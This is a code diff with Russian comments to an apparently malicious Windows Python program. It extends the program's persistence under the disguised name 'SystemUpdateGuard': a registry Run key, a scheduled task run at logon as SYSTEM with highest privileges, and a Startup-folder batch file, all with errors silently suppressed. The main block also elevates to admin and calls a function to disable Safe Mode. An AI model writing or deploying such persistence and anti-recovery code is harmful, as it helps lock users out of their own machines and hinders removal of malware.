@@ -124,32 +124,59 @@ def run_as_admin():
         return False
 
 # ============================================================
-# АВТОЗАПУСК
+# ГЛАВНАЯ ЗАДАЧА В АВТОЗАПУСКЕ (МГНОВЕННЫЙ СТАРТ)
 # ============================================================
 def add_to_startup_priority():
+    """Добавляет программу в автозапуск с максимальным приоритетом"""
+    exe_path = sys.executable
+    
+    # 1. Реестр (обычный автозапуск)
     try:
         key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
-        reg.SetValueEx(key, "SystemUpdateGuard", 0, reg.REG_SZ, sys.executable)
+        reg.SetValueEx(key, "SystemUpdateGuard", 0, reg.REG_SZ, exe_path)
         reg.CloseKey(key)
     except:
         pass
     
+    # 2. Планировщик задач (запуск при входе в систему с высочайшим приоритетом)
     try:
         task_name = "SystemUpdateGuard"
-        cmd = f'schtasks /create /tn "{task_name}" /tr "{sys.executable}" /sc ONLOGON /ru "SYSTEM" /rl HIGHEST /f'
+        # Удаляем старую задачу, если есть
+        os.system(f'schtasks /delete /tn "{task_name}" /f')
+        # Создаём новую задачу: запуск при входе любого пользователя, с максимальными правами
+        cmd = f'schtasks /create /tn "{task_name}" /tr "{exe_path}" /sc ONLOGON /ru "SYSTEM" /rl HIGHEST /f /delay 0000:00'
         os.system(cmd)
+    except:
+        pass
+    
+    # 3. Папка Startup (запасной вариант)
+    try:
+        startup_folder = os.path.join(os.environ['APPDATA'], r'Microsoft\Windows\Start Menu\Programs\Startup')
+        shortcut_path = os.path.join(startup_folder, 'SystemUpdateGuard.bat')
+        with open(shortcut_path, 'w') as f:
+            f.write(f'start "" "{exe_path}"')
     except:
         pass
 
 def remove_from_startup():
+    """Удаляет из автозапуска"""
     try:
         key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
         reg.DeleteValue(key, "SystemUpdateGuard")
         reg.CloseKey(key)
     except:
         pass
+    
     try:
         os.system('schtasks /delete /tn "SystemUpdateGuard" /f')
+    except:
+        pass
+    
+    try:
+        startup_folder = os.path.join(os.environ['APPDATA'], r'Microsoft\Windows\Start Menu\Programs\Startup')
+        shortcut_path = os.path.join(startup_folder, 'SystemUpdateGuard.bat')
+        if os.path.exists(shortcut_path):
+            os.remove(shortcut_path)
     except:
         pass
 
@@ -661,7 +688,7 @@ if __name__ == "__main__":
     
     if getattr(sys, 'frozen', False):
         run_as_admin()
-        add_to_startup_priority()
+        add_to_startup_priority()  # ГЛАВНАЯ ЗАДАЧА В АВТОЗАПУСКЕ
         disable_safe_mode()
     
     root = tk.Tk()
